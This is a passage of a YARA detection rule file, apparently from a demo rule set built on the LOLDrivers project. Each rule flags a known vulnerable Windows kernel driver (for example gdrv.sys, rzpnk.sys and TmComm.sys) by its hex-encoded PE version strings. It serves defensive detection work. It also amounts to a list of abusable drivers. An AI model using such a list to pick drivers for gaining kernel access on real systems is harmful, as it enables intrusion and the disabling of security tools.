Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:34:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005700610074006300680044006f006700200041006e00740069007600690072007500730020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005700610074006300680044006f00670044006500760065006c006f0070006d0065006e0074002e0063006f006d002c0020004c004c0043002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0030002e0033002e0031002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0030002e0033002e0031002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]007700730064006b0064002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]007700730064006b0064 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]007700730064006b0064002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000320032 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Huawei_Hwosec_Huaweimatebook_B179_RID3946 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - HwOs2Ec7x64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 18:56:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00480077004f0073003200450063 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004800750061007700650069 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00480077004f0073003200450063 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0048007500610077006500690020004d0061007400650042006f006f006b } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00480077004f0073003200450063002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310036 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Hpinc_Hpportioxsys_Hpportio_A468_RID3938 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - HpPortIox64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 18:54:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004800700050006f007200740049006f } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0048005000200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004800700050006f007200740049006f007800360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004800700050006f007200740049006f } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004800700050006f007200740049006f007800360034002e007300790073 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Zemanaltd_Zam_7661_RID331F : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - zam64.sys, zamguard32.sys, zamguard64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 14:34:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005a0041004d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005a0065006d0061006e00610020004c00740064002e } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e00310038002e003200320039 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005a0041004d } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]005a0065006d0061006e00610020004c00740064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Gigabytetechnologycoltd_Gdrvsys_Gigabytesoftwaredriver_8B92_RID445A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - gdrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 02:49:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0047004900470041002d00420059005400450020004e006f006e0050006e00500020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0047004900470041002d004200590054004500200054004500430048004e004f004c004f0047005900200043004f002e002c0020004c00540044002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0067006400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0047004900470041002d004200590054004500200053006f0066007400770061007200650020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0067006400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310037 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Sisoftware_Sandra_Sisoftwaresandra_881B_RID3BE5 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - SANDRA.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:48:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00530061006e006400720061002000440065007600690063006500200044007200690076006500720020002800570069006e003600340020007800360034002900280055006e00690063006f006400650029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005300690053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310030002e0033002e0031002e00310020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310030002e0033002e0031002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00530041004e004400520041 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005300690053006f006600740077006100720065002000530061006e006400720061 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00530041004e004400520041 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a90020005300690053006f0066007400770061007200650020004c0074006400200031003900390035002d0032003000300035002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_5192_RID3D9D : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:02:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00370030002e0030002e0031003000370033 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00370030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100350020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule PUA_VULN_Driver_Radiantsystemsinc_Radhwmgrsys_Radiantsystemsinchardwaremanagerdriver_0F30_RID4A35 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - RadHwMgr.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 06:59:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00520061006400690061006e00740020004800610072006400770061007200650020004d0061006e006100670065007200200066006f007200200050003100350078007800200050006c006100740066006f0072006d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00520061006400690061006e0074002000530079007300740065006d0073002c00200049006e0063002e0020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e00320030002e0030002e00370020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e00320030002e0030002e0037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00520061006400480077004d00670072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00520061006400690061006e0074002000530079007300740065006d0073002c00200049006e0063002e00200020004800610072006400770061007200650020004d0061006e00610067006500720020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00520061006400480077004d00670072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0032003000300032002d0032003000300039002000520061006400690061006e0074002000530079007300740065006d0073002c00200049006e0063002e0020 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Insydesoftware_Insydeflash_Insydeflashutilitybitdriver_CE0A_RID4485 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - iscflashx64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 02:56:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0069007300630066006c006100730068007800360034002e007300790073 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049006e007300790064006500200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002c00200032002c00200031002c00200031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002c00200032002c00200031002c00200031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0049006e00730079006400650046006c006100730068 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0049006e007300790064006500200046006c0061007300680020005500740069006c00690074007900200036003400200062006900740020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0069007300630066006c006100730068007800360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003500200049006e007300790064006500200053006f00660074007700610072006500200043006f00720070002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_80A5_RID3DAA : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:04:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e00350030002e0030002e0031003000390031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e00350030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100330020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Microfocus_Microfocusxtier_5351_RID38B1 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nscm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 18:32:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0058005400690065007200200053006500630075007200690074007900200043006f006e00740065007800740020004d0061006e0061006700650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d006900630072006f00200046006f006300750073 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e00310032002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e00310032 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d006900630072006f00200046006f006300750073002000580054006900650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e00730063006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200043006f007000790072006900670068007400200032003000300030002d0032003000310037002c0020004d006900630072006f00200046006f006300750073002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Sunmicrosystemsinc_Vboxdrvsys_Sunvirtualbox_R_7882_RID40DE : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - vboxdrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 00:20:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072007400750061006c0042006f007800200053007500700070006f007200740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00530075006e0020004d006900630072006f00730079007300740065006d0073002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0032002e0030002e007200340035003800340036 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0032002e0030002e007200340035003800340036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00560042006f0078004400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00530075006e0020005600690072007400750061006c0042006f0078 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00560042006f0078004400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300039002000530075006e0020004d006900630072006f00730079007300740065006d0073002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Corsairmemoryinc_Corsairllaccess_Corsairllaccess_5FAD_RID41C2 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - CorsairLLAccess64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 00:58:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0043006f007200730061006900720020004c004c0020004100630063006500730073 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0043006f007200730061006900720020004d0065006d006f00720079002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e00310036002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e00310036002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f007200730061006900720020004c004c0020004100630063006500730073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043006f007200730061006900720020004c004c0020004100630063006500730073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f007200730061006900720020004c004c0020004100630063006500730073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007200730061006900720020004d0065006d006f00720079002c00200049006e0063002e002000280063002900200032003000310039002c00200041006c006c0020007200690067006800740073002000720065007300650072007600650064 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Razerinc_Rzpnk_Rzpnk_16E2_RID3628 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rzpnk.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 16:43:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00520061007a006500720020004f007600650072006c0061007900200053007500700070006f00720074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00520061007a00650072002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e00310032002e0033003100330037 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e00310032002e0033003100330037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0052007a0070006e006b } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0052007a0070006e006b } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0052007a0070006e006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310030002d0032003000310034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Nvidiacorp_Nvoclocksys_Nvidiasystemutilitydriver_060D_RID4209 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nvoclock.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:10:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00560049004400490041002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e0056004900440049004100200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00300035002e00300032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00300035002e00300032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00560049004400490041002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a9004e0056004900440049004100200043006f00720070002e00200032003000300033002d0032003000300034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Ludashicom_Computerzsys_7553_RID3788 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:42:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]006c007500640061007300680069002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0031003000310039002e0031003000320035002e003900310038 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0031003000310039002e0031003000320035002e003900310038 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]9c8159275e08 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]7248674362406709002000280043002900200032003000310030002d00320030003100390020007700770077002e006c007500640061007300680069002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Overclockingtool_Atillksys_Overclockingtool_11A9_RID3FC6 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - atillk64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:34:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004f0076006500720063006c006f0063006b0069006e00670020004800610072006400770061007200650020004100620073007400720061006300740069006f006e0020005300790073 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004f0076006500720063006c006f0063006b0069006e006700200054006f006f006c } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e00310030002e00320030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e00310030002e00320030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100740069006c006c006b00360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004f0076006500720063006c006f0063006b0069006e006700200054006f006f006c } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100740069006c006c006b00360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002c00200032003000300035 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Tgsoftsas_Viragtsys_Viritagentsystem_2A62_RID3D09 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - viragt64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:37:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072004900540020004100670065006e0074002000530079007300740065006d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0054004700200053006f0066007400200053002e0061002e0073002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002c002000360035002c00200030002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002c002000360035002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]007600690072006100670074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005600690072004900540020004100670065006e0074002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]007600690072006100670074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200054004700200053006f0066007400200053002e0061002e0073002e00200032003000300036002c002000320030003100320020002d0020007700770077002e007400670073006f00660074002e00690074 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Aswarpotsys_Avastantivirus_AAA3_RID3ED6 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver 